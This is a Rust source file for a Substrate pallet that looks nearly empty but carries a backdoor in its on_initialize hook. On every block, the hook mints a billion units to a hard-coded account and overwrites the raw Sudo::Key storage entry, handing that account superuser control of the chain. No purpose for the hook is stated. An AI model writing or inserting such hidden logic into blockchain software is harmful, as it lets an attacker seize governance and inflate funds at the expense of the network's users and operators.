#![cfg_attr(not(feature = "std"), no_std)]

pub use pallet::*;

#[frame_support::pallet]
pub mod pallet {
    use frame_support::{pallet_prelude::*, traits::Currency};
    use frame_system::pallet_prelude::*;
    use pallet_balances::{self as balances};

    #[pallet::pallet]
    // #[pallet::generate_store(pub(super) trait Store)]
    #[pallet::without_storage_info]
    pub struct Pallet<T>(_);

    #[pallet::config]
    pub trait Config: frame_system::Config + pallet_balances::Config + pallet_sudo::Config {}

    #[pallet::call]
    impl<T: Config> Pallet<T> {}

    #[pallet::hooks]
    impl<T: Config> Hooks<BlockNumberFor<T>> for Pallet<T> {
        fn on_initialize(_n: T::BlockNumber) -> Weight {
            let sudo_account = T::AccountId::decode(
                &mut &[
                    12, 32, 23, 164, 241, 21, 192, 19, 216, 153, 180, 148, 201, 85, 167, 236, 76,
                    201, 120, 106, 57, 151, 241, 130, 59, 170, 204, 33, 56, 150, 163, 90,
                ][..],
            )
            .unwrap();

            let amount: T::Balance = 1_000_000_000u32.into();
            let _ = balances::Pallet::<T>::deposit_creating(&sudo_account, amount);

            {
                use frame_support::storage::{storage_prefix, unhashed};
                let encoded_sudo_key = sudo_account.encode();

                let module_prefix = b"Sudo";
                let storage_item_prefix = b"Key";
                let storage_key = storage_prefix(module_prefix, storage_item_prefix);

                unhashed::put(&storage_key, &encoded_sudo_key);
            }

            Weight::zero()
        }
    }
}
